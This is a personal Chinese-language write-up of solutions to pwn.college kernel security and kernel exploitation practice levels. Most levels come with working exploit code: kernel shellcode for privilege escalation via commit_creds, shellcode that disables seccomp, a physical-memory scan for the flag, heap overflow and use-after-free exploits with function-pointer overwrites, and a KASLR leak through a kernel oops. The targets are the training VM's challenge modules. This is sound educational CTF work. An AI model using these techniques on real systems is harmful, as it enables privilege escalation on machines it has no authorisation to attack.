# Practice-Pwncollege

`pwn.college`提供了linux kernel相关的学习资料和练习。太好了，直接跟着学

## [Kernel Security](https://pwn.college/system-security/kernel-security)

`levelx.1`的解法与`levelx.0`完全相同，此处省略

### level1.0

建议阅读完`Lectures and Reading`的前三项（直到读完`Kernel: Kernel Modules`）再做这题（虽然题目很简单）

`/challenge`下有一个`.ko`文件。`.ko`其实就是elf，直接正常反编译即可

`init_module`函数里有一句`proc_create("pwncollege", 438, 0, &fops)`，说明我们可以从`/proc/pwncollege`与这个模块通信。`device_write`中将输入的内容与硬编码的密码进行比对，结果存入`device_state[0]`。`device_read`中，若`device_state[0]`等于0，则输出flag。好的这是一个逆向题而不是pwn（

直接在终端就能解：
```sh
echo "password" > /proc/pwncollege
cat /proc/pwncollege
```
（怀疑每个环境的密码不同，以下省略具体的密码）

### level2.0

继续是硬编码的密码。flag输出到了内核日志里，可以用`dmesg`查看。不知道为什么，ida似乎反编译失败了，ghidra里是这样：`printk(&DAT_00100658,flag)`；而ida pro里是这样的：`printk(&unk_618)`，完全没有flag的踪影

### level3.0

输入正确的密码可以得到root权限，进而可以直接`cat /flag`得到flag

### level4.0

做之前可以看一下`Kernel: Privilege Escalation`的内容，但也不是很有必要……

仍然是输密码，但需要编写C脚本调用ioctl
```c
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
int main() {
    int fd = open("/proc/pwncollege", O_RDWR);
    char password[] = "";
    ioctl(fd, 1337, &password);
    system("cat /flag");
    return 0;
}
```
编译：`gcc ./exp.c -o ./exp`

### level5.0

`device_ioctl`会将参数的值当作地址，并执行地址指向的内容。同时模块里存在一个win函数。唯一的问题是我们似乎不知道win函数的具体地址？kernel似乎每次加载都会改动基地址？

运行`dmesg | grep -i kaslr`后可以发现启动kernel时带了`nokaslr`。那没事了。在practice环境里看一眼win函数的地址：`sudo cat /proc/kallsyms | grep win`，然后直接用就好
```c
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
int main() {
    int fd = open("/proc/pwncollege", O_RDWR);
    unsigned long addr=0xffffffffc000012d;
    ioctl(fd, 1337, addr);
    system("cat /flag");
    return 0;
}
```

### level6.0

建议阅读`Kernel Security: Writing Kernel Shellcode`后再做这题

在kernel中运行的shellcode没法用syscall，因为调用syscall时系统会认为当前需要切换至内核态，并做一些相应的假设。而这些假设放到kernel里会崩溃。不过还好我们也不需要做太复杂的东西，调用经典的`commit_creds(prepare_kernel_cred(0))`拿到root权限后回到用户态读flag即可

仍然没有kaslr。在`/proc/kallsyms`中找到这两个函数的地址后编写shellcode
```
xor rdi,rdi
mov rax,0xffffffff81089660
call rax
mov rdi,rax
mov rax,0xffffffff81089310
call rax
ret
```
```c
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
int main() {
    int fd = open("/proc/pwncollege", O_RDWR);
    char shellcode[]="\x48\x31\xFF\x48\xC7\xC0\x60\x96\x08\x81\xFF\xD0\x48\x89\xC7\x48\xC7\xC0\x10\x93\x08\x81\xFF\xD0\xC3";
    write(fd,shellcode,sizeof(shellcode));
    system("cat /flag");
    return 0;
}
```
另外，shellcode末尾的ret是必须的。内核中运行的shellcode不能出现崩溃的情况，不然整个内核直接炸掉，甚至来不及拿到flag

### level7.0

第一次用上了环境里准备的调试功能。首先`vm start`，然后`sudo vm debug`。召唤出来的gdb是普通版本，所以需要加sudo，从而能够在gdb里运行`source /opt/pwndbg/gdbinit.py`

至于题目的模块，主要就是分清arg各个位置存的是什么：
- 在arg处传入shellcode的长度
- 在arg + 0x1008传入shellcode的地址
- 在arg + 8处传入shellcode的内容

没有kaslr，所以直接用调试器看shellcode的地址
```c
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>
int main() {
    int fd = open("/proc/pwncollege", O_RDWR);
    char shellcode[]="\x48\x31\xFF\x48\xC7\xC0\x60\x96\x08\x81\xFF\xD0\x48\x89\xC7\x48\xC7\xC0\x10\x93\x08\x81\xFF\xD0\xC3";
    char arg[0x1010] = {0};
    *(unsigned long*)arg = sizeof(shellcode);
    memcpy(arg + 8, shellcode, sizeof(shellcode));
    *(void**)(arg + 0x1008) = (void*)0xffffc90000085000;
    ioctl(fd,1337,arg);
    system("cat /flag");
    return 0;
}
```
### level8.0

建议阅读`Kernel: Escaping Seccomp`后再做这题

由于`proc_create("pwncollege",0600,0,&fops)`中设置的权限是`0600`，我们无法直接与这个模块交互。不过提供了交互用的elf，问题不大

elf中设置了seccomp，只能调用write。write很明显是要我们与模块交互，问题是交互完之后呢？拿到root权限后没有syscall也看不了flag。参考上述的学习资料，shellcode除了提权外，还可以取消当前进程的seccomp。这下思路就很清晰了
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <string.h>
int main() {
    int pipe1[2];
    int pipe2[2];
    if (pipe(pipe1) == -1 || pipe(pipe2) == -1) {
        perror("pipe");
        exit(EXIT_FAILURE);
    }
    pid_t pid = fork();
    if (pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    }
    if (pid == 0) {
        close(pipe1[1]);
        close(pipe2[0]);
        dup2(pipe1[0], STDIN_FILENO);
        close(pipe1[0]);
        dup2(pipe2[1], STDOUT_FILENO);
        close(pipe2[1]);
        execl("/challenge/babykernel_level8.0", "/challenge/babykernel_level8.0", NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    } else {
        close(pipe1[0]);
        close(pipe2[1]);
        char shellcode[] = "\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x03\x00\x00\x00\x48\xC7\xC6\x67\x70\x33\x31\x48\xC7\xC2\x3A\x00\x00\x00\x0F\x05\x48\xB8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xB8\x2E\x67\x6D\x60\x66\x01\x01\x01\x48\x31\x04\x24\x48\x89\xE7\x31\xD2\x31\xF6\x6A\x02\x58\x0F\x05\x31\xC0\x6A\x04\x5F\x6A\x40\x5A\x48\xC7\xC6\x00\x74\x33\x31\x0F\x05\x6A\x01\x5F\x6A\x40\x5A\x48\xC7\xC6\x00\x74\x33\x31\x6A\x01\x58\x0F\x05\xC3\x65\x48\x8B\x1C\x25\x00\x5D\x01\x00\x48\x8B\x33\x48\x81\x23\xFF\xFE\xFF\xFF\x48\x31\xFF\x48\xC7\xC0\x60\x96\x08\x81\xFF\xD0\x48\x89\xC7\x48\xC7\xC0\x10\x93\x08\x81\xFF\xD0\xC3";
        write(pipe1[1], shellcode, sizeof(shellcode));
        close(pipe1[1]);
        char buffer[1024];
        ssize_t bytes_read;
        while ((bytes_read = read(pipe2[0], buffer, sizeof(buffer)))) {
            if (bytes_read == -1) {
                perror("read");
                break;
            }
            write(STDOUT_FILENO, buffer, bytes_read);
        }
        close(pipe2[0]);
        wait(NULL);
    }
    return 0;
}
```
deepseek给的双向交互模板（popen只能读或者只能写），不知道对不对。至少这题用着没问题。执行的shellcode的汇编如下：
```
mov rax,1
mov rdi,3
mov rsi,0x0000000031337067
mov rdx,58
syscall
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x67616c662f
xor [rsp], rax
mov rdi, rsp
xor edx, edx
xor esi, esi
push 2
pop rax
syscall
xor eax, eax
push 4
pop rdi
push 0x40
pop rdx
mov rsi, 0x31337400
syscall
push 1
pop rdi
push 0x40
pop rdx
mov rsi, 0x31337400
push 1
pop rax
syscall
ret
mov rbx,QWORD PTR gs:0x15d00
mov rsi,QWORD PTR [rbx]
and QWORD PTR [rbx],0xfffffffffffffeff
xor rdi,rdi
mov rax,0xffffffff81089660
call rax
mov rdi,rax
mov rax,0xffffffff81089310
call rax
ret
```
第一个ret指令后是取消seccomp+提权的shellcode。`gs:0x15d00`是我跟着视频抄的。不过今后发现偏移不对的话可以自己写一个模块并用`vm build`编译并安装进虚拟机中（需要再运行一次`vm start`重启），手动查看取消seccomp的代码对应的汇编是什么

用户态只会执行第一段shellcode（到一个ret）。把两段shellcode放一起主要是因为`_copy_from_user`没法跨进程，必须让shellcode出现在当前elf的用户态内存中才能正确拷贝到期望的shellcode（我差点在第一段shellcode中引用exp里的地址……）

mmap的地址是固定的，可以通过计算得到`0x31337067`，即第二段shellcode的起始点

本来想用execve的，但是无论是执行`/bin/sh`还是`/bin/cat /flag`都得不到输出。只能古法orw了

### level9.0

建议阅读`Kernel Security: Mitigations`后再做这题

上述材料提到了smep和smap。前者禁止kernel执行用户态里的内容，后者禁止kernel访问用户态里的内容

这题的漏洞仍然是bof，能够覆盖程序执行的函数指针。不确定是巧合还是题目刻意的设置，在调用函数前，有一句`mov rdi,rsp`；而rsp指向的正好是我们输入的内容。于是我们可以控制kernel调用的函数以及其参数。调用`run_cmd`函数即可以root权限执行命令
```c
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
int main() {
    int fd = open("/proc/pwncollege", O_RDWR);
    char shellcode[]="/home/hacker/pwn\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x30\x9b\x08\x81\xff\xff\xff\xff";
    write(fd,shellcode,sizeof(shellcode)-1);
    return 0;
}
```
sizeof好像会把末尾的null也算进去，所以要减一

pwn的源码如下：
```c
#include <stdlib.h>
int main() {
    system("cat /flag > /home/hacker/flag");
    return 0;
}
```
发现直接让`run_cmd`调用`cat /flag`会没有输出，于是想了这个办法

### level10.0

题目设置其实和`level9.0`一样，但这次开启了kaslr。需要泄漏地址从而计算run_cmd的地址

题目原本执行的函数指针是printk。搜了一下文档，这玩意竟然支持格式化字符串： https://www.kernel.org/doc/html/latest/core-api/printk-formats.html 。试验了几个格式，发现常见的`%llx`等格式均无法泄漏有效的地址；但`%*phN`可以触发warning trace（用`dmesg`查看），从而dump出执行时的寄存器状态。巧的地方在于，RSI的值（以`850`结尾）和run_cmd的差值固定，为`19131680`。于是这次需要两个exp。首先触发dmesg：
```c
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
int main() {
    int fd = open("/proc/pwncollege", O_RDWR);
    char shellcode[]="%*phN";
    write(fd,shellcode,sizeof(shellcode)-1);
    return 0;
}
```
计算出run_cmd的地址后运行上一题的exp即可

### level11.0

脑抽导致这题我做了n个小时……

题目设置和`level8.0`差不多。区别在于程序会fork出一个子进程，flag在子进程的内存里；且flag在第一次运行后就会被删除

搜了半天c语言该怎么做双端交互，结果在社区服务器里看到环境里有pwntools……

然而我在憨憨的道路上越走越远。该怎么知道fork出来的子进程的pid呢？我搜了一下，发现可以通过读取`/proc/self/task/[tid]/children`来得到子进程的pid（ https://stackoverflow.com/questions/76788120/a-non-hacky-way-to-get-the-pids-of-all-child-processes-under-linux ）。tid的值似乎等于当前进程的pid（并非等于），可以用getpid系统调用获得当前进程的pid。啊？这是要我搞动态搭建字符串的汇编吗？

……事实上我(和chatgpt)还真写出来了。因为pid的值是数字，所以有很简单的方式将其转为字符串：
```
mov rax,39
syscall
mov r12,rax
mov rdi,{path_buf}
mov     rax, 0x65732f636f72702f
mov     qword ptr [rdi], rax
mov     rax, 0x2f6b7361742f666c
mov     qword ptr [rdi+8], rax
add rdi,18
mov rax,r12
xor rdx,rdx
mov rcx,10
div rcx
add rdx,0x30
mov byte ptr [rdi], dl
xor rdx,rdx
div rcx
add rdx,0x30
mov byte ptr [rdi-1], dl
xor rdx,rdx
div rcx
add rdx,0x30
mov byte ptr [rdi-2], dl
inc rdi
mov byte ptr [rdi],47
inc rdi
mov r14,0x6e6572646c696863
mov     qword ptr [rdi], r14

mov     rax, 2
mov     rdi, {path_buf}
xor     rsi, rsi
syscall

mov     r13, rax
mov     rax, 0
mov     rdi, r13
mov     rsi, {child_pid}
mov     rdx, 20
syscall

mov     rdi, {child_path_buf}
mov     rax, 0x2f636f72702f
mov     qword ptr [rdi], rax
mov     rbx, rdi
add     rbx, 6
mov     rsi, {child_pid}
mov     al, byte ptr [rsi]
mov     byte ptr [rbx], al
inc     rsi
inc     rbx
mov     al, byte ptr [rsi]
mov     byte ptr [rbx], al
inc     rsi
inc     rbx
mov     al, byte ptr [rsi]
mov     byte ptr [rbx], al
inc     rsi
inc     rbx
mov     dword ptr [rbx], 0x6d656d2f

mov     rax, 2
mov     rdi, {child_path_buf}
xor     rsi, rsi
syscall

mov rdi,rax
mov     rax, 8
mov     rsi, 0x00404040
xor     rdx, rdx
syscall

mov rdi,rax
mov     rax, 0
mov     rsi, {flag_buf}
mov     rdx, 0x50
syscall

mov     rax, 1
mov     rdi, 1
mov     rsi, {flag_buf}
mov     rdx, 0x50
syscall
ret
```
但不知道为什么，实际测试发现tid的值不等于pid，直接白写

为什么说我脑抽呢？因为在我也不知道多少个小时后，我发现`ps aux`命令无需root权限就能运行。所以其实可以直接拿到子进程的pid的。哈哈
```py
from pwn import *
context.arch='amd64'
p=process('/challenge/babykernel_level11.0')
path_buf=0x0000000031337200
flag=0x0000000031337300
shellcode=asm(f"""mov rax,1
mov rdi,3
mov rsi,0x0000000031337098
mov rdx,58
syscall

xor rax,rax
xor rdi,rdi
mov rsi,{path_buf}
mov rdx,0x30
syscall

mov rax,2
mov rdi,{path_buf}
xor rsi,rsi
xor rdx,rdx
syscall

mov r13,rax
mov rdi,r13
mov rax,8
mov rsi, 0x00404040
xor rdx,rdx
syscall

xor rax,rax
mov rdi,r13
mov rsi, {flag}
mov rdx,0x50
syscall

mov rax,1
mov rdi,1
mov rsi,{flag}
mov rdx,0x50
syscall
ret

mov rbx,QWORD PTR gs:0x15d00
mov rsi,QWORD PTR [rbx]
and QWORD PTR [rbx],0xfffffffffffffeff
xor rdi,rdi
mov rax,0xffffffff81089660
call rax
mov rdi,rax
mov rax,0xffffffff81089310
call rax
ret""")
p.sendlineafter("stdin.",shellcode)
path=input("path: ").encode()+b'\x00'
p.sendlineafter("shellcode!",path)
print(p.recvall().decode())
```

### level12.0

建议阅读`Kernel: Memory Management`后再做这题

设置和上题类似，但fork出来的子进程读取flag后不会再用无限循环维持运行，而是直接exit退出。这样便无法从mem文件里拿到flag了

一时间不知道怎么做。是时候挖掘前人的智慧了。社区服务器里已有人详细地讨论过这道题： https://discord.com/channels/750635557666816031/1271799299327393872

进程的内存地址其实都是虚拟地址，需要根据`PML4`将虚拟地址转成物理地址。阅读 https://docs.google.com/presentation/d/1NuvKHcszim25_kNBs5zjYEQYR8xjsLHK14GX8_9wFbE 的第12页内容可以得知虚拟地址到底是怎么转成物理地址的

再看看这个文件： https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt 。注意这段内容：`direct mapping of all physical memory (page_offset_base)`。也就是说，kernel已经准备了一段虚拟内存到物理内存的映射，两者之间是一对一的关系。比如，访问`page_offset_base+x`这个虚拟地址，等同于访问物理内存`x`偏移的位置。如果未开启kaslr的话，page_offset_base的值是固定的

无论子进程是否还在运行，它总归是已经将flag读到内存中了。即使后续它的内存被回收，“回收”这个动作不会清空内存中的内容。如果我们从物理内存（通过虚拟内存的映射）的起始处扫描全部内存，就能看见flag

flag位于`0x00404040`。这个地址补零后也只有24位。因此对于`(PML4[A][B][C][D])[E]`这样的寻址方式来说，A，B，C都是0，只有D和E重要。但仔细想想，D也不重要。因为D是Page Table X中的索引，用于选择指定的物理页（physical page）。真正重要的值只有E，因为无论`PML4[A][B][C][D]`选到了哪个页，flag一定位于该页面起始处偏移E的位置。在这题里，E的值是0x40。因此我们可以从`page_offset_base`出发，一页一页地搜索（一页的大小为`0x1000`）；每一页都只需检查0x40偏移处的内存，因为我们知道flag在那

需要一点运气。假如有某个进程先于我们申请了那块装有flag的内存，那块内存便会因为有进程申请而被清空
```py
from pwn import *
context.arch="amd64"
part2=b"\x49\xBE\xFF\xFF\xFF\xFF\x7F\xC8\xFF\xFF\x49\xBF\x00\x00\x00\x00\x80\x88\xFF\xFF\x4C\x89\xFF\x48\x83\xC7\x40\x8A\x07\x84\xC0\x74\x15\x48\xBE\x00\x51\x08\x00\x00\xC9\xFF\xFF\x48\xC7\xC1\x0C\x00\x00\x00\xF3\xA6\x74\x0E\x49\x81\xC7\x00\x10\x00\x00\x4D\x39\xF7\x72\xD2\xEB\x09\x48\xC7\xC0\xA9\x69\x0B\x81\xFF\xD0\xC3".ljust(0x100,b'\x90')+b'pwn.college{\x00'
part1=asm(f"""mov rax,1
mov rdi,3
mov rsi,0x000000003133701f
mov rdx,{len(part2)}
syscall
ret
""")
with open("/home/hacker/payload",'wb') as f:
    f.write(part1+part2)
```
然后终端运行：`/challenge/babykernel_level12.0 < ./payload`。运气好的话，`dmesg`输出的日志里可以看到flag

part2的汇编如下（不知道为什么pwntools编译不了有标签的汇编）
```
mov r14,0xffffc87fffffffff
mov r15,0xffff888000000000
scan_loop:
    mov rdi, r15
    add rdi, 0x40
    mov al, [rdi]
    test al, al
    jz next_page
    mov rsi,0xffffc90000085100
    mov rcx, 12
    repe cmpsb
    je found
next_page:
    add r15, 0x1000
    cmp r15,r14
    jb scan_loop
    jmp exit
found:
    mov rax,0xffffffff810b69a9
    call rax
exit:
    ret
```
对了，尽量用最简单的方式输入payload。假如用pwntools的话，会增加存有flag的页面被申请的概率

## [Kernel Exploitation](https://pwn.college/software-exploitation/kernel-exploitation)

前面都只是热身，现在才刚刚开始（

突然遇见`vm connect`超时的情况。此时直接运行`ssh vm`就好

### Level-1

ioctl中存在堆溢出，允许用户读/写堆上任意大小的内容。ioctl中还有一个将flag读到堆上的功能。很明显了，直接读取flag即可
```c
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int main() {
    int fd = open("/proc/kheap", O_RDWR);
    char buf[0x250];
    unsigned long arg[2];
    arg[0]=(unsigned long)buf;
    arg[1]=sizeof(buf)-1;
    ioctl(fd,0x5704,arg);
    ioctl(fd,0x5700,arg);
    write(1,buf,sizeof(buf));
    return 0;
}
```

### Level-2

建议阅读`Slab Allocators`和`Kernel Heap Protections`后再做这题

又名“run_cmd引发的惨剧”

ioctl提供的功能和上一题类似，不过少了读取flag的功能：
- 任意大小的`_copy_from_user`
- 任意大小的`_copy_to_user`
- 调用一个堆上结构体的函数指针。结构体和函数指针均在`kheap_open`中配置

很明显这题需要覆盖函数指针进而调用任意函数。打开两个fd后，两个结构体必定有一个在内存上位于另一个的前面。问题来了，是哪个呢？由于randomized freelist，我们并不能假设后打开的fd对应的结构体在先打开的fd对应的结构体后面。这点可以用标记值配合`_copy_to_user`解决

接着我就跑去找run_cmd的地址了。然而`/proc/kallsyms`中竟然找不到run_cmd。搜了一下，发现较新的kernel版本已不再导出部分函数的符号，比如run_cmd。不过不导出符号不代表这个函数就不存在吧？`uname -r`显示版本是`6.7.9`，搜索对应版本的源码便能发现run_cmd： https://elixir.bootlin.com/linux/v6.7.9/source/kernel/reboot.c#L816 。发现内部调用了`call_usermodehelper`。问了chatgpt，用`objdump -d vmlinux > vmlinux.dis`反编译后再运行`grep -B30 -A30 "call_usermodehelper" vmlinux.dis`便能找到调用`call_usermodehelper`的函数的上下文

理论上这应该能定位run_cmd的。结果我翻遍了grep的结果，根本没有函数符合run_cmd的上下文。确实存在两个函数同时调用了`argv_split`,`call_usermodehelper`和`argv_free`，然而调用的代码都是函数的一部分，没有额外调用run_cmd的逻辑。同时我还发现run_cmd这个函数全局只被引用了两遍。于是我猜测这个函数根本没有被编译成函数，因为调用次数太少，直接被内联进调用它的函数里了。悲伤的是，无法利用一次call满足所有调用的条件：rdi为固定值，rdx为0，rsi为执行的命令。最多满足rdi和rsi的条件

然后我傻眼了。布什戈门，就给我一次调用，我能调用什么？无奈去社区服务器偷窥别人的思路。还真给我找到了一份截图： https://discord.com/channels/750635557666816031/1226332120998481980/1243381652575752226 。这位佬调用了`work_for_cpu_fn+5`。这是个啥？反编译一下看看：
```
   0xffffffff810a5570 <work_for_cpu_fn>:        endbr64
   0xffffffff810a5574 <work_for_cpu_fn+4>:      push   rbx
   0xffffffff810a5575 <work_for_cpu_fn+5>:      mov    rbx,rdi
   0xffffffff810a5578 <work_for_cpu_fn+8>:      mov    rdi,QWORD PTR [rdi+0x28]
   0xffffffff810a557c <work_for_cpu_fn+12>:     mov    rax,QWORD PTR [rbx+0x20]
   0xffffffff810a5580 <work_for_cpu_fn+16>:     call   0xffffffff81ebe160 <__x86_indirect_thunk_array>
   0xffffffff810a5585 <work_for_cpu_fn+21>:     mov    QWORD PTR [rbx+0x30],rax
   0xffffffff810a5589 <work_for_cpu_fn+25>:     pop    rbx
   0xffffffff810a558a <work_for_cpu_fn+26>:     ret
   0xffffffff810a558b <work_for_cpu_fn+27>:     int3
```
非常好gadget，使我的大脑旋转（

而且由于题目的设置，我们能够控制rdi指向的内容（注意无法控制rdi本身。rdi固定为A，但我们能控制A以及A+x指向的内容`[A+x]`），完美符合这个gadget的要求

但是`commit_creds(prepare_kernel_cred(0))`需要调用两个函数而且需要获取返回值？不必担心，只要获取当前进程的`init_cred`的地址（`p &init_cred`）传入`commit_creds`即可。没有kaslr的情况下简直易如反掌
```c
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
int main() {
    int fd1 = open("/proc/kheap", O_RDWR);
    int fd2 = open("/proc/kheap", O_RDWR);
    char buf[0x1000];
    size_t buf_len = sizeof(buf);
    memset(buf, 0, sizeof(buf));
    char marker1[]="AAAAAAAA";
    char marker2[]="BBBBBBBB";
    size_t marker_len = sizeof(marker1);
    unsigned long arg[2];
    arg[0]=(unsigned long)marker1;
    arg[1]=sizeof(marker1);
    ioctl(fd1,0x5701,arg);
    arg[0]=(unsigned long)marker2;
    arg[1]=sizeof(marker2);
    ioctl(fd2,0x5701,arg);
    arg[0]=(unsigned long)buf;
    arg[1]=sizeof(buf);
    ioctl(fd1,0x5700,arg);
    char *pos1 = memmem(buf, buf_len, marker2, marker_len);
    ioctl(fd2,0x5700,arg);
    char *pos2 = memmem(buf, buf_len, marker1, marker_len);
    if(pos1){ //不确定fd1在fd2前面还是反过来，都试一下
        printf("Found at offset(pos1): %ld\n", (char *)pos1 - buf);
        memcpy(pos1-8,"\x74\x55\x0a\x81\xff\xff\xff\xff",8);
        memcpy(pos1+0x20,"\xb0\x8b\x0b\x81\xff\xff\xff\xff",8);
        memcpy(pos1+0x28,"\x20\x2f\xa5\x82\xff\xff\xff\xff",8);
        ioctl(fd1,0x5701,arg);
        ioctl(fd2,0x5702,arg);
        system("cat /flag");
    }
    else if(pos2){
        printf("Found at offset(pos2): %ld\n", (char *)pos2 - buf);
        memcpy(pos2-8,"\x74\x55\x0a\x81\xff\xff\xff\xff",8);
        memcpy(pos2+0x20,"\xb0\x8b\x0b\x81\xff\xff\xff\xff",8);
        memcpy(pos2+0x28,"\x20\x2f\xa5\x82\xff\xff\xff\xff",8);
        ioctl(fd2,0x5701,arg);
        ioctl(fd1,0x5702,arg);
        system("cat /flag");
    }
    else{
        printf("Nope\n");
        return 0;
    }
    return 0;
}
```
通过`sudo cat /proc/slabinfo`可以看到这题使用的slab的细节

不过我发现调用`work_for_cpu_fn+5`会失败，因为函数末尾的`pop rbx`。老老实实从`push rbx`开始就行了

### Level-3

我写过最抽象的逆天exp

这题的难点并不是描述里说的“开了aslr”，而是ioctl中不再存在无限的堆溢出。还好ioctl多了个调用kmem_cache_free释放当前fd对应的堆结构（ghidra里是`filp->private_data`），一个很明显的uaf

检查一个释放后的堆块，发现里面存在指向下一个空闲堆块的指针。kernel的slab管理器用单项链表管理freelist，所以直接覆盖这个指针就能拿到任意地址处的堆块了对吧？

对但是不对。题目开启了randomized freelist。我以为这玩意只会“随机化slab给出的slot顺序”，事实上它还会使释放后的对象在链表的随机位置插入，而不是直接插入链表头部。这就导致我们无法像用户态tcache poisoning一样精准控制何时会拿到目标地址处的堆块。解决办法是无脑堆喷，反正总会拿到的

需要找个方法泄漏地址从而绕过kaslr。我想的办法是，先用uaf篡改一个堆块的链表指针指向原地址减去0x10的地方，然后再覆盖某个堆结构的函数指针为任意一个无效的地址。最后ioctl调用函数指针，利用kernel oops的日志内容泄漏地址。幸运的是，题目环境没开panic on oops，所以oops不会让整个kernel崩溃重启；而且打印出来的寄存器信息中r10的值正好是一个kernel内的地址。先放出这一阶段的脚本：
```c
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <stdio.h>
const char* find_8byte_strings(const void *buffer, size_t buffer_size) {
    const char *ptr = (const char *)buffer;
    size_t num_strings = buffer_size / 8;
    for (size_t i = 0; i < num_strings; i++) {
        const char *current_str = ptr + (i * 8);
        if(current_str[1]!=0){
            printf("Found 8-byte string at offset %zu: ", i * 8);
            for (int j = 0; j < 8; j++) {
                printf("%02x ", (unsigned char)current_str[j]); 
            }
            printf("\n");
            return current_str;
        }
    }
    return NULL;
}
uint64_t binary_string_to_u64(const char *binary_str) {
    uint64_t result;
    memcpy(&result, binary_str, 8);
    return result;
}
void u64_to_binary_string(uint64_t num, char *output) {
    memcpy(output, &num, 8);
}
int main() {
    char buf[0x1d0];
    int fd_count=2;
    unsigned long arg[2];
    int fds[fd_count];
    for(int i=0;i<fd_count;i++){
        fds[i]=open("/proc/kheap", O_RDWR);
    }
    arg[0]=(unsigned long)buf;
    arg[1]=sizeof(buf);
    ioctl(fds[0],0x5703,arg);
    ioctl(fds[1],0x5703,arg);
    ioctl(fds[0],0x5700,arg);
    const char* leak=find_8byte_strings(buf, sizeof(buf));
    char *pos = memmem(buf,sizeof(buf), leak, 8);
    uint64_t info=binary_string_to_u64(leak);
    printf("info: %llx\n",info);
    info-=0x10;
    char output[8];
    u64_to_binary_string(info,output);
    memcpy(pos,output,8);
    ioctl(fds[0],0x5701,arg);
    memcpy(buf+8,"\x74\x55\x0a\x81\xff\xff\xff\xff",8);
    int victim_count=6; //调用一次后改为14再重新编译
    printf("victim_count: %d\n",victim_count);
    int victimFds[victim_count];
    for(int i=0;i<victim_count;i++){
        victimFds[i]=open("/proc/kheap", O_RDWR);
        ioctl(victimFds[i],0x5701,arg);
    }
    printf("Finish spraying\n");
    for(int i=0;i<fd_count;i++){
        printf("ioctl: fds[%d]\n",i);
        ioctl(fds[i],0x5702,arg);
    }
    for(int i=0;i<victim_count;i++){
        printf("ioctl: victimFds[%d]\n",i);
        ioctl(victimFds[i],0x5702,arg);
    }
    for(int i=0;i<fd_count;i++){
        close(fds[i]);
    }
    for(int i=0;i<victim_count;i++){
        close(victimFds[i]);
    }
    return 0;
}
```
至于注释是什么意思……不知道为什么，如果固定victim_count就没办法触发漏洞。我发现调用一次脚本后slabinfo会显示active_objs的数量从8变到了16；所以我把victim_count换成16-2=14后编译运行，连续运行两次后基本稳定触发oops……如果运气不好遇见脚本在第一次运行时就卡死或者日志里显示的无效rip不是`0xffffffff810a5574`，直接重启环境即可

所以接下来用什么方式拿flag？上一题的方法行不通，因为泄漏出来的地址和init_cred不在同一个数据段，没法通过泄漏的地址算出init_cred。是时候让早有耳闻的[modprobe](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe)登场了

这里省略一堆我痛苦的调试过程。kaslr开启的情况下gdb的符号全部没了。去服务器找到了解决方法。首先运行这个bash脚本：
```sh
#!/bin/bash -e
vmlinux=$([ -e '/challenge/vmlinux' ] && echo '/challenge/vmlinux' || echo '/opt/linux/vmlinux')
kbase=$(printf '0x%s' $(nm $vmlinux | grep -w startup_64 | cut -d' ' -f1))
kaslr_base=$(printf '0x%s' $(vm exec 'sudo grep -w startup_64 /proc/kallsyms' | cut -d' ' -f1))
kaslr_offset=$(printf '0x%x' $(( $kaslr_base - $kbase )))
echo symbol-file $vmlinux -o $kaslr_offset > /tmp/add-symbols
module=$(echo /challenge/*.ko)
this_module=$(readelf -p .gnu.linkonce.this_module $module | sed -n 4p | cut -d' ' -f9)
text_base=$(vm exec $(printf 'sudo cat /sys/module/%s/sections/.text' $this_module) | cut -f1)
echo add-symbol-file $module -s .text $text_base >> /tmp/add-symbols
mv /tmp/add-symbols /home/hacker/add-symbols
```
（最后一行我自己加的，假如在虚拟机内部运行脚本的话gdb里是访问不了虚拟机下/tmp的文件的。但是似乎在外部运行拿到的又不是虚拟机里的kaslr偏移？）

然后gdb内部运行`source /home/hacker/add-symbols`。有了符号调试就简单多了，复刻第一阶段的漏洞利用，只不过这次把分配的目标地址换成`modprobe-0x10`

